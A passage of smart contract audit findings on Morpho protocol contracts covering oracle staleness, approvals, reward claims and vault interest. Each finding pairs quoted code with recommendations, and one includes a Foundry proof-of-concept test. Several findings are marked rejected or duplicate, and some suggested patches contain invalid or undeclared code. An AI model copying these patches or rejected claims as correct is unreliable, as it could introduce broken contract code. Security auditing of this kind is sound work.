     /// @param reward The address of the reward token.
@@ -117,24 +119,27 @@ contract UniversalRewardsDistributor is IUniversalRewardsDistributorStaticTyping
         returns (uint256 amount)
     {
         require(root != bytes32(0), ErrorsLib.ROOT_NOT_SET);
+        bytes32 hash = keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable))));
+        require(!claimedHash[hash], ErrorsLib.CLAIMABLE_TOO_LOW);
+        claimedHash[hash] = true;
         require(
-            MerkleProof.verifyCalldata(
-                proof, root, keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable))))
-            ),
+            MerkleProof.verifyCalldata(proof, root, hash),
             ErrorsLib.INVALID_PROOF_OR_EXPIRED
         );
 
-        require(claimable > claimed[account][reward], ErrorsLib.CLAIMABLE_TOO_LOW);
+        //require(claimable > claimed[account][reward], ErrorsLib.CLAIMABLE_TOO_LOW);
 
-        amount = claimable - claimed[account][reward];
+        // amount = claimable - claimed[account][reward];
 
-        claimed[account][reward] = claimable;
+        claimed[account][reward] += claimable;
 
-        ERC20(reward).safeTransfer(account, amount);
+        ERC20(reward).safeTransfer(account, claimable);
 
-        emit EventsLib.Claimed(account, reward, amount);
+        emit EventsLib.Claimed(account, reward, claimable);
     }
```



### Virtual supply shares steal interest

**Severity:** Medium risk

**Context:** [MetaMorpho.sol#L590-L590](metamorpho/src/MetaMorpho.sol#L590-L590)

**Description**: The virtual supply shares, that are not owned by anyone, implicitly earn interest as the shares-to-asset conversions used in `withdraw` involve the virtual assets.

```solidity
function _convertToSharesWithTotals(
    uint256 assets,
    uint256 newTotalSupply,
    uint256 newTotalAssets,
    Math.Rounding rounding
) internal pure returns (uint256) {
    return assets.mulDiv(newTotalSupply + 10 ** _decimalsOffset(), newTotalAssets + 1, rounding);
}
```

This interest is stolen from the actual suppliers which leads to loss of interest funds for users. Note that while the initial share price of 1e-6 might make it seem like the virtual shares can be ignored, one can increase the supply share price and the virtual shares will have a bigger claim on the total asset percentage.

**Recommendation**: The virtual shares should not earn interest as they don't correspond to any supplier.




### User may not withdraw fund from Metamorpho when borrow asset is too much or bad debt is too much	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** [MetaMorpho.sol#L829-L832](metamorpho/src/MetaMorpho.sol#L829-L832)

**Description**

User may not withdraw fund from Metamorpho

when withdraw from the morpho lending market,

the code will make sure the transaction does not revert and compute the toWithdraw amount

```solidity
    function _withdrawMorpho(uint256 assets) internal {
        for (uint256 i; i < withdrawQueue.length; ++i) {
            Id id = withdrawQueue[i];
            MarketParams memory marketParams = _marketParams(id);
            (uint256 supplyAssets,, Market memory market) = _accruedSupplyBalance(marketParams, id);

            uint256 toWithdraw = UtilsLib.min(
                _withdrawable(marketParams, market.totalSupplyAssets, market.totalBorrowAssets, supplyAssets), assets
            );
```

then we are calling

```solidity
    function _withdrawable(
        MarketParams memory marketParams,
        uint256 totalSupplyAssets,
        uint256 totalBorrowAssets,
        uint256 supplyAssets
    ) internal view returns (uint256) {
        uint256 availableLiquidity = UtilsLib.min(
            totalSupplyAssets - totalBorrowAssets, ERC20(marketParams.loanToken).balanceOf(address(MORPHO))
        );

        return UtilsLib.min(supplyAssets, availableLiquidity);
    }
```

but in the case when all asset are borrowed out or the user's asset is used to cover the [bad debt (when totalSupplyAssets is reduced)](https://github.com/morpho-org/morpho-blue/blob/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/Morpho.sol#L395)

combining with that withdraw has no slippage control, 

user may withdraw much less asset than he anticipated

in the worst, user cannot withdraw asset when borrow asset is greater than supply assets on time

```solidity
position[id][onBehalf].supplyShares -= shares;
market[id].totalSupplyShares -= shares.toUint128();
market[id].totalSupplyAssets -= assets.toUint128();

require(market[id].totalBorrowAssets <= market[id].totalSupplyAssets, ErrorsLib.INSUFFICIENT_LIQUIDITY);
```

because transaction revert in this [line of code](https://github.com/morpho-org/morpho-blue/blob/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/Morpho.sol#L220)

**Recommendation**

add slippage protection for withdraw function

add documentation to warn user that they may not withdraw their asset back in the worst case



### Misconfigured Irm can lead to user loss of funds with existing Morpho.sol	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

Using the adaptative curve irm with all the maximum parameters can lead to user loss of funds ( due to int128 conversion when calling accrueinterest method from Morpho.sol), the existing require are not sufficient to avoid this behaviour.

**Recommendation**:

Add some ratio constant bounds between all the parameters of the curve, these bounds can be optimised by simulation.

**POC**

First of all, we need to modify the BaseTest.sol to use AdaptativeCurve.sol with some authorized parameters, irm = new AdaptiveCurveIrm(address(morpho),8 * 1e18,6 ,6,6* ( int256(0.001e9 ether) / 365 days));

After, we need to create this test (modification of existing test adding waiting time between borrow and repay). For the sake of demonstration, we use an irrealistic amount of time without action of 4e8 but this number can be optimized.

function testBugAccrueInterest(uint256 amountCollateral, uint256 priceCollateral) public {

	// Bounding some inputs to avoid case with amout with huge decimals
	uint256 amountSupplied = 85413000000000;
	uint256 amountBorrowed = 7522100000000;
	uint256 amountRepaid = 1356385611 ;

	// Avoid values egal to 0
	vm.assume( amountCollateral > 100);
	vm.assume (priceCollateral>1);
	
	// Making supply collateral esay
	(amountCollateral, amountBorrowed, priceCollateral) =
        _boundHealthyPosition(amountCollateral, amountBorrowed, priceCollateral);
	
	// Supply
	_supply(amountSupplied);

    oracle.setPrice(priceCollateral);
	
	// Balance setting
    collateralToken.setBalance(ONBEHALF, amountCollateral);
    loanToken.setBalance(REPAYER, amountRepaid);
	
	// Borrowing action
    vm.startPrank(ONBEHALF);
    morpho.supplyCollateral(marketParams, amountCollateral, ONBEHALF, hex"");
    morpho.borrow(marketParams, amountBorrowed, 0, ONBEHALF, RECEIVER);
    vm.stopPrank();

	// fast forward
	vm.roll(block.number + 4e8);
    vm.warp(block.timestamp + 4e8 * BLOCK_TIME); // Block speed should depend on test network.
	
	// Repaying action
    vm.prank(REPAYER);

	//vm.expectRevert("max uint128 exceeded");
    (uint256 returnAssets, uint256 returnShares) = morpho.repay(marketParams, amountRepaid, 0, ONBEHALF, hex"");
}

Launching Forge, we can get this error with reasonable inputs : Failing tests:

[FAIL. Reason: max uint128 exceeded Counterexample: calldata=0x0xd57d7c910000000000000000000000000000000000000000000000000000000000000065000000000000000000000000000000000000000000000000000000066efc4983, args=[101, 27631831427 [2.763e10]]] testBugAccrueInterest(uint256,uint256) (runs: 0, μ: 0, ~: 0)



### Assessment of Price Update Mechanism Vulnerability in Morpho Blue's ChainlinkOracle Contract	_(duplicate of [Don't check chainlink's latestRoundData return stale or incorrect result])_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Bug Description 
Upon examining the code below, it's evident that when fetching prices for specific assets from Chainlink, it only checks if the price is non-zero.

```solidity
// morpho-blue-oracles/src/ChainlinkOracle.sol - ChainlinkOracle
contract ChainlinkOracle is IOracle {
    ...
    constructor(
        IERC4626 vault,
        AggregatorV3Interface baseFeed1,
        AggregatorV3Interface baseFeed2,
        AggregatorV3Interface quoteFeed1,
        AggregatorV3Interface quoteFeed2,
        uint256 vaultConversionSample,
        uint256 baseTokenDecimals,
        uint256 quoteTokenDecimals
    ) {
        // The ERC4626 vault parameter is used to price `VAULT_CONVERSION_SAMPLE` of its shares, so it requires dividing
        // by that number, hence the division by `VAULT_CONVERSION_SAMPLE` in the `SCALE_FACTOR` definition.
        // Verify that vault = address(0) => vaultConversionSample = 1.
        require(
            address(vault) != address(0) || vaultConversionSample == 1, ErrorsLib.VAULT_CONVERSION_SAMPLE_IS_NOT_ONE
        );
        require(vaultConversionSample != 0, ErrorsLib.VAULT_CONVERSION_SAMPLE_IS_ZERO);

        VAULT = vault;
        VAULT_CONVERSION_SAMPLE = vaultConversionSample;
        BASE_FEED_1 = baseFeed1;
        BASE_FEED_2 = baseFeed2;
        QUOTE_FEED_1 = quoteFeed1;
        QUOTE_FEED_2 = quoteFeed2;
        SCALE_FACTOR = 10
            ** (
                36 + quoteTokenDecimals + quoteFeed1.getDecimals() + quoteFeed2.getDecimals() - baseTokenDecimals
                    - baseFeed1.getDecimals() - baseFeed2.getDecimals()
            ) / vaultConversionSample;
    }

    /* PRICE */

    /// @inheritdoc IOracle
    function price() external view returns (uint256) {
        return SCALE_FACTOR.mulDiv(
            VAULT.getAssets(VAULT_CONVERSION_SAMPLE) * BASE_FEED_1.getPrice() * BASE_FEED_2.getPrice(),
            QUOTE_FEED_1.getPrice() * QUOTE_FEED_2.getPrice()
        );
    }
}


// morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol
library ChainlinkDataFeedLib {
    /// @dev Performs safety checks and returns the latest price of a `feed`.
    /// @dev When `feed` is the address zero, returns 1.
    /// @dev Notes on safety checks:
    /// - L2s are not supported.
    /// - Staleness is not checked because it's assumed that the Chainlink feed keeps its promises on this.
    /// - The price is not checked to be in the min/max bounds because it's assumed that the Chainlink feed keeps its
    /// promises on this.
    function getPrice(AggregatorV3Interface feed) internal view returns (uint256) {
        if (address(feed) == address(0)) return 1;

        (, int256 answer,,,) = feed.latestRoundData();
        require(answer >= 0, ErrorsLib.NEGATIVE_ANSWER);

        return uint256(answer);
    }

    /// @dev Returns the number of decimals of a `feed`.
    /// @dev When `feed` is the address zero, returns 0.
    function getDecimals(AggregatorV3Interface feed) internal view returns (uint256) {
        if (address(feed) == address(0)) return 0;

        return feed.decimals();
    }
}
```

Such code typically functions without issues. However, problems may arise when Chainlink Oracle halts due to extreme market volatility, leading to no further updates in prices. (https://medium.com/quillhash/venus-protocol-loses-11m-due-to-chainlink-%EF%B8%8F-f6cd2728e8cf)

This code is utilized for appraising the value of collateral in the Morpho Blue Lending Market. Thus, it can potentially trigger significant arbitrage that adversely affects users of certain Morpho Blue markets.

- Recommendation

It is advisable to require users to input variables related with heartbeat check for each Chainlink Aggregator when creating the ChainlinkOracle Contract through the Constructor. Additionally, modify the getPrice function to revert if the sum of the latest update time and the specified heartbeat is less than the current block.timestamp.



### test1234

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

test



### Most of important functions in the URD contract can not be called - due to lack of an input validation	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** [UrdFactory.sol#L34-L34](universal-rewards-distributor/src/UrdFactory.sol#L34-L34)

- Description

Within the UrdFactory#`createUrd()`, a given address would be assigned into the `initialOwner` parameter and it would be used to create a new URD (UniversalRewardsDistributor) contract like this: \
https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/universal-rewards-distributor/src/UrdFactory.sol#L27 \
https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/universal-rewards-distributor/src/UrdFactory.sol#L34
```solidity
    /// @notice Creates a new URD contract using CREATE2 opcode.
    /// @param initialOwner The initial owner of the URD.
    /// @param initialTimelock The initial timelock of the URD.
    /// @param initialRoot The initial merkle root of the URD.
    /// @param initialIpfsHash The optional ipfs hash containing metadata about the root (e.g. the merkle tree itself).
    /// @param salt The salt used for CREATE2 opcode.
    /// @return urd The address of the newly created URD.
    function createUrd(
        address initialOwner,  ///<--------------- @audit
        uint256 initialTimelock,
        bytes32 initialRoot,
        bytes32 initialIpfsHash,
        bytes32 salt
    ) public returns (UniversalRewardsDistributor urd) {
        urd = new UniversalRewardsDistributor{salt: salt}(
            initialOwner, ///<--------------- @audit
            initialTimelock,
            initialRoot,
            initialIpfsHash
        );

        isUrd[address(urd)] = true;
        ...
```

Within the UniversalRewardsDistributor#`constructor()`, the given `initialOwner` would be set as the `owner` via the UniversalRewardsDistributor#`_setOwner()` like this: \
https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L68 \
https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L69
```solidity
    /// @notice Initializes the contract.
    /// @param initialOwner The initial owner of the contract.
    /// @param initialTimelock The initial timelock of the contract.
    /// @param initialRoot The initial merkle root.
    /// @param initialIpfsHash The optional ipfs hash containing metadata about the root (e.g. the merkle tree itself).
    /// @dev Warning: The `initialIpfsHash` might not correspond to the `initialRoot`.
    constructor(address initialOwner, uint256 initialTimelock, bytes32 initialRoot, bytes32 initialIpfsHash) {  ///<--------------- @audit
        _setOwner(initialOwner);  ///<--------------- @audit
        _setTimelock(initialTimelock);
        _setRoot(initialRoot, initialIpfsHash);
    }
```

Since **any users** can call the UrdFactory#`createUrd()`, some users may accidentally forget to assign a certain address into the `initialOwner` parameter - when the users would call the UrdFactory#`createUrd()`. 
In this case, **zero-address** (`address(0)`) would be assigned into the `initialOwner` parameter. 
As a result, within the UniversalRewardsDistributor#`constructor()`, the `address(0)` would be set as the `owner` via the UniversalRewardsDistributor#`_setOwner()`.

This is problematic because the following privileged-functions by the `onlyOwner()` modifier in the UniversalRewardsDistributor contract would **never** be able to be called - due to that the `owner` of the URD contract would be `address(0)`.
- UniversalRewardsDistributor#`setTimelock()` \
  https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L154
- UniversalRewardsDistributor#`setOwner()` \
   https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L172
- UniversalRewardsDistributor#`setRootUpdater()` \
   https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L163

Since the root updater would be set via the `setRootUpdater()`, which the access is restricted by the `onlyOwner()` modifier, the following privileged-functions by the `onlyUpdaterRole()` modifier in the UniversalRewardsDistributor contract would also **never** be able to be called as well.
- UniversalRewardsDistributor#`submitRoot()` \
   https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L80
- UniversalRewardsDistributor#`revokePendingRoot()` \
   https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L100
- UniversalRewardsDistributor#`setRoot()` \
   https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L143

- Recommendation
Within the UrdFactory#`createUrd()`, consider adding an input validation to check whether or not a given `initialOwner` would **not** be a **zero-address** (`address(0)`) like this:
```diff
    function createUrd(
        address initialOwner, 
        uint256 initialTimelock,
        bytes32 initialRoot,
        bytes32 initialIpfsHash,
        bytes32 salt
    ) public returns (UniversalRewardsDistributor urd) {
+       require(initialOwner != address(0), "The given initialOwner must not be a zero-address");
        urd = new UniversalRewardsDistributor{salt: salt}(
            initialOwner, 
            initialTimelock,
            initialRoot,
            initialIpfsHash
        );

        isUrd[address(urd)] = true;
        ...
```



### Some tokens would be reverted in the MetaMorpho#`constructor()` - due to being always forced to approve with `type(uint256).max`	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** [MetaMorpho.sol#L133-L133](metamorpho/src/MetaMorpho.sol#L133-L133)

- Description
Within the MetaMorpho#`constructor()`, a given `_asset` (ERC20 token) would always be approved with the full amount (`type(uint256).max`) via the SafeERC20#`forceApprove()` like this: \
https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L133
```solidity
    /// @dev Initializes the contract.
    /// @param owner The owner of the contract.
    /// @param morpho The address of the Morpho contract.
    /// @param initialTimelock The initial timelock.
    /// @param _asset The address of the underlying asset.
    /// @param _name The name of the vault.
    /// @param _symbol The symbol of the vault.
    constructor(
        address owner,
        address morpho,
        uint256 initialTimelock,
        address _asset,
        string memory _name,
        string memory _symbol
    ) ERC4626(IERC20(_asset)) ERC20Permit(_name) ERC20(_name, _symbol) Ownable(owner) {
        if (morpho == address(0)) revert ErrorsLib.ZeroAddress();

        MORPHO = IMorpho(morpho);
        ...

        IERC20(_asset).forceApprove(morpho, type(uint256).max); ///<---------- @audit
    }
```

Within the SafeERC20#`forceApprove()`, the IERC20#`approve()` would be called with a given `spender` and `value` like this: \
https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#L77
```solidity
    /**
     * @dev Set the calling contract's allowance toward `spender` to `value`. If `token` returns no value,
     * non-reverting calls are assumed to be successful. Meant to be used with tokens that require the approval
     * to be set to zero before setting it to a non-zero value, such as USDT.
     */
    function forceApprove(IERC20 token, address spender, uint256 value) internal {
        bytes memory approvalCall = abi.encodeCall(token.approve, (spender, value));

        if (!_callOptionalReturnBool(token, approvalCall)) {
            _callOptionalReturn(token, abi.encodeCall(token.approve, (spender, 0)));
            _callOptionalReturn(token, approvalCall);
        }
    }
```

According to the ["Revert on Large Approvals & Transfers"](https://github.com/d-xo/weird-erc20#revert-on-large-approvals--transfers), some tokens (e.g.  `UNI`,  `COMP`) revert if the value passed to  `approve`  or  `transfer`  is larger than  `uint96` like this:

> Some tokens (e.g.  `UNI`,  `COMP`) revert if the value passed to  `approve`  or  `transfer`  is larger than  `uint96`.
>
> Both of the above tokens have special case logic in  `approve`  that sets  `allowance`  to  `type(uint96).max`  if the approval amount is  `uint256(-1)`, which may cause issues with systems that expect the value passed to  `approve`  to be reflected in the  `allowances`  mapping.

However, Within the MetaMorpho#`constructor()`, a given `_asset` (ERC20 token) would always be approved with the `type(uint256).max` via IERC20#`approve()` through the SafeERC20#`forceApprove()`. 

This lead to that the transaction would be reverted - if  some tokens (i.e. `$UNI`,  `$COMP`) would be used as a `_asset` in the MetaMorpho#`constructor()`.


- Recommendation
Within the MetaMorpho#`constructor()`, consider adding a parameter of the approval amount (`_maxApprovalAmount`) - so that a vault creator can choose the appropriate approval amount depends on a given ERC20 token (`_asset`) like this:

```diff
    constructor(
        address owner,
        address morpho,
        uint256 initialTimelock,
        address _asset,
+       uint256 memory _maxApprovalAmount,
        string memory _name,
        string memory _symbol
    ) ERC4626(IERC20(_asset)) ERC20Permit(_name) ERC20(_name, _symbol) Ownable(owner) {
        if (morpho == address(0)) revert ErrorsLib.ZeroAddress();

        MORPHO = IMorpho(morpho);
        ...

+       if (_maxApprovalAmount != 0) {
+           IERC20(_asset).forceApprove(morpho, _maxApprovalAmount);
+       } else {
+           IERC20(_asset).forceApprove(morpho, type(uint256).max);
+       } 
-       IERC20(_asset).forceApprove(morpho, type(uint256).max);
    }
```




### The price-retrieved via the ChainlinkDataFeedLib#`getPrice()` may be a `stale` price	_(duplicate of [Don't check chainlink's latestRoundData return stale or incorrect result])_

**Severity:** Medium risk

**Context:** [ChainlinkDataFeedLib.sol#L23-L23](morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol#L23-L23)

- Description

Within the ChainlinkOracle#`price()`, the ChainlinkDataFeedLib#`getPrice()` would be called to for the price calculation of the asset like this: \
https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/morpho-blue-oracles/src/ChainlinkOracle.sol#L118 \
https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/morpho-blue-oracles/src/ChainlinkOracle.sol#L119
```solidity
    /// @inheritdoc IOracle
    function price() external view returns (uint256) {
        return SCALE_FACTOR.mulDiv(
            VAULT.getAssets(VAULT_CONVERSION_SAMPLE) * BASE_FEED_1.getPrice() * BASE_FEED_2.getPrice(),
            QUOTE_FEED_1.getPrice() * QUOTE_FEED_2.getPrice() ///<--------- @audit
        );
    }
```

Within the ChainlinkDataFeedLib#`getPrice()`, the AggregatorV3Interface#`latestRoundData()` would be called to retrieve the price. And then, it would be validated like this:  \
https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol#L23 \
https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol#L24
```solidity
library ChainlinkDataFeedLib {
    /// @dev Performs safety checks and returns the latest price of a `feed`.
    /// @dev When `feed` is the address zero, returns 1.
    /// @dev Notes on safety checks:
    /// - L2s are not supported.
    /// - Staleness is not checked because it's assumed that the Chainlink feed keeps its promises on this.
    /// - The price is not checked to be in the min/max bounds because it's assumed that the Chainlink feed keeps its
    /// promises on this.
    function getPrice(AggregatorV3Interface feed) internal view returns (uint256) {
        if (address(feed) == address(0)) return 1;

        (, int256 answer,,,) = feed.latestRoundData(); ///<------------- @audit
        require(answer >= 0, ErrorsLib.NEGATIVE_ANSWER);

        return uint256(answer);
    }
```

However, within the ChainlinkDataFeedLib#`getPrice()`, there is no validation to check whether or not the price-retrieved via the AggregatorV3Interface#`latestRoundData()` would be a **stale price**.

This lead to returning a **stale price** of the asset to the ChainlinkOracle#`price()`.



- Recommendation

Within the ChainlinkDataFeedLib#`getPrice()`, consider adding a validation to check whether or not the price-retrieved via the AggregatorV3Interface#`latestRoundData()` would be a **stale price** like this:
```diff
library ChainlinkDataFeedLib {
    function getPrice(AggregatorV3Interface feed) internal view returns (uint256) {
        if (address(feed) == address(0)) return 1;

+       (, int256 answer,,, uint80 answeredInRound) = feed.latestRoundData();
-       (, int256 answer,,,) = feed.latestRoundData();
        require(answer >= 0, ErrorsLib.NEGATIVE_ANSWER);
+       require(answeredInRound >= roundId, "Stale price");

        return uint256(answer);
    }
```



### Chainlink.latestRoundData() may return stale results	_(duplicate of [Don't check chainlink's latestRoundData return stale or incorrect result])_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

The [ChainlinkDataFeedLib.getPrice()](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol#L23) function is used to get the price of tokens, the problem is that the function does not check for stale results.
```solidity
    function getPrice(AggregatorV3Interface feed) internal view returns (uint256) {
        if (address(feed) == address(0)) return 1;

        (, int256 answer,,,) = feed.latestRoundData();
        require(answer >= 0, ErrorsLib.NEGATIVE_ANSWER);

        return uint256(answer);
    }

```
There are some [reasons](https://ethereum.stackexchange.com/questions/133242/how-future-resilient-is-a-chainlink-price-feed/133843#133843) that the price feed can become stale.
Read the [updatedAt](https://docs.chain.link/data-feeds/api-reference#latestrounddata) return value from the Chainlink.latestRoundData() function and verify that is not older than than specific time tolerance.
```solidity
require(block.timestamp - udpatedData < toleranceTime, "stale price");

```



### ChainlinkDataFeedLib.getPrice may return a stale price	_(duplicate of [Don't check chainlink's latestRoundData return stale or incorrect result])_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Description

```solidity
File: morpho-blue-oracles\src\libraries\ChainlinkDataFeedLib.sol
20:     function getPrice(AggregatorV3Interface feed) internal view returns (uint256) {
21:         if (address(feed) == address(0)) return 1;
22: 
23:->       (, int256 answer,,,) = feed.latestRoundData();
24:         require(answer >= 0, ErrorsLib.NEGATIVE_ANSWER);
25: 
26:         return uint256(answer);
27:     }
```

The `updatedAt` timestamp in the price feed response is not checked. So outdated prices may be used. If the returned price is higher than the real market price, the borrower can borrow more loanToken and may make a profit without repaying the debt.

- Recommendation

Introduce a reasonable limit for how old the price can be and revert if the price is older.



### In the long run, MetaMorpho may not be able to supply assets via MORPHO.supply	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Description

it's a common implementation (see both OpenZeppelin and Solmate) that the `transferFrom` function of an ERC20 token does not decrease the allowance of the spender when such allowance has been set to the max value `type(uint256).max`.

If MetaMorpho's asset does not follow this logic and decrease it by the amount transferred from the sender to the recipient, MetaMorpho will not work properly when the allowance is reduced to 0. Next, take [[USDC](https://etherscan.io/token/0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)](https://etherscan.io/token/0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48) as example:

```solidity
//USDC  https://etherscan.io/address/0xa2327a938febf5fec13bacfb16ae10ecbc4cbdcf#code#L846
function transferFrom(
        address from,
        address to,
        uint256 value
    )
......
    {
        require(
            value <= allowed[from][msg.sender],
            "ERC20: transfer amount exceeds allowance"
        );
        _transfer(from, to, value);
->      allowed[from][msg.sender] = allowed[from][msg.sender].sub(value);
        return true;
    }
```

MetaMorpho approves the maximum value of `_asset` to MORPHO in the constructor.

```solidity
File: metamorpho\src\MetaMorpho.sol
118:     constructor(
119:         address owner,
120:         address morpho,
121:         uint256 initialTimelock,
122:         address _asset,
123:         string memory _name,
124:         string memory _symbol
125:     ) ERC4626(IERC20(_asset)) ERC20Permit(_name) ERC20(_name, _symbol) Ownable(owner) {
126:         if (morpho == address(0)) revert ErrorsLib.ZeroAddress();
127: 
128:         MORPHO = IMorpho(morpho);
129: 
130:         _checkTimelockBounds(initialTimelock);
131:         _setTimelock(initialTimelock);
132: 
133:->       IERC20(_asset).forceApprove(morpho, type(uint256).max);
134:     }
```

There are three functions that internally call `MORPHO.supply` to transfer assets from MetaMorpho to MORPHO, which will spend allowance.

- [[deposit](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L559)](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L559)
- [[mint](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L572)](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L572)
- [[reallocate](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L397)](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L397), every time it is called, a large amount of assets are withdrawn/supplied between multiple markets.

The result is that at some point in the future, the `transferFrom` operation will revert because the spender would not have enough allowance anymore. This results in MetaMorpho no longer being able to supply assets into markets.

- Recommendation

Add a function to perform `IERC20(_asset).forceApprove(morpho, type(uint256).max)`, which anyone can call.



### `Permit2Bundler#transferFrom2` might not work in some cases	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_



- Proof of Concept

Take a look at [Permit2Bundler.sol#L43-L50](https://github.com/morpho-org/morpho-blue-bundlers/blob/23c6215801558fcedc0556aea6fc92b85c3ba8f2/src/Permit2Bundler.sol#L43-L50)

```solidity
    function transferFrom2(address asset, uint256 amount) external payable protected {
        address _initiator = initiator();
        amount = Math.min(amount, ERC20(asset).balanceOf(_initiator));

        require(amount != 0, ErrorsLib.ZERO_AMOUNT);

        Permit2Lib.PERMIT2.transferFrom(_initiator, address(this), amount.toUint160(), asset);
    }
```

As seen, this function is used to transfer a specific amount of any ERC20 token to the bundler from the initialtor, issue with this is that it uses the `transferFrom` that expect a bool return value, but for some popular tokens such as [USDT](https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7#code#L171) if the `transferFrom` does not return a value, then `Permit2Lib.PERMIT2.transferFrom(_initiator, address(this), amount.toUint160(), asset);` would fail, this is cause the bytecode compiled by the solidity compiler from the attempt to `transferFrom` will check whether the return size is 1 byte. If not, revert will occur.

- Impact

Ay execution requiring a call to the `Permit2Bundler.sol's` `transferFrom2` would revert for such tokens, limiting adoption and causing protocol not to be compatible with these tokens.

- Recommended Mitigation Steps

Use `safeTransferFrom` from solady/utils/SafeTransferLib.sol.




### An account might never get their rightfully earned rewards sent to them	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_


- Proof of Concept

Take a look at [UniversalRewardsDistributor.sol#L115-L136](https://github.com/morpho-org/universal-rewards-distributor/blob/cc55aeaa70d0410d696fd4c9a3560dc80255884a/src/UniversalRewardsDistributor.sol#L115-L136)

```solidity
    function claim(address account, address reward, uint256 claimable, bytes32[] calldata proof)
        external
        returns (uint256 amount)
    {
        require(root != bytes32(0), ErrorsLib.ROOT_NOT_SET);
        require(
            MerkleProof.verifyCalldata(
                proof, root, keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable))))
            ),
            ErrorsLib.INVALID_PROOF_OR_EXPIRED
        );

        require(claimable > claimed[account][reward], ErrorsLib.CLAIMABLE_TOO_LOW);

        amount = claimable - claimed[account][reward];

        claimed[account][reward] = claimable;
        //@audit
        ERC20(reward).safeTransfer(account, amount);

        emit EventsLib.Claimed(account, reward, amount);
    }
```

As seen, the function is used to claim rewards for any account from any reward token.

Issue is that the reward token could be any ERC20 token, and the some of the most popular ERC20 token out there implement a blacklisting mechanism, let's use USDC & USDT as examples, would be key to note that they are the most adopted stablecoins in the market, both currently amounting to `110 billion $+` market cap, now issue is that both `USDC/USDT` have a blocklisting mechanism where they can add any address to this list and as such stop interactions with their tokens from this address, for USDC, it has a `notBlacklisted()` modifier that's required for functions such as `transfer()`, `transferFrom()` and `approve()`.

In this protocol's specific scenario, if an account's address gets blacklisted by the underlying reward ERC20 token, then this line: ` ERC20(reward).safeTransfer(account, amount);` reverts, since the receiver of these rewards has been hardcoded to be the `account`, essentially leading to anyone not being able to call `claim()` for the `account` for any of their reward tokens leaving them stuck in the protocol.

- Impact

Reward mechanism is flawed, since this functionality wouldn't be avialable for some users since they can't claim these rewards, essentially leaving them stuck in the protocol.

- Recommended Mitigation Steps

A popular approach of fixing this bug case is to always allow the user to provide a fresh address, i.e in this case, the `account` should be the only one that has access to the `claim()` function and they should also be allowed to provide a fresh address to get their reward tokens sent.




### `CompoundV2MigrationBundler.sol` does not have adequate checks in regards to external Compound integration	_(duplicate of [Missing important check if `repay` and `redeem` functions in `CompoundV2MigrationBundler.sol` are successful])_

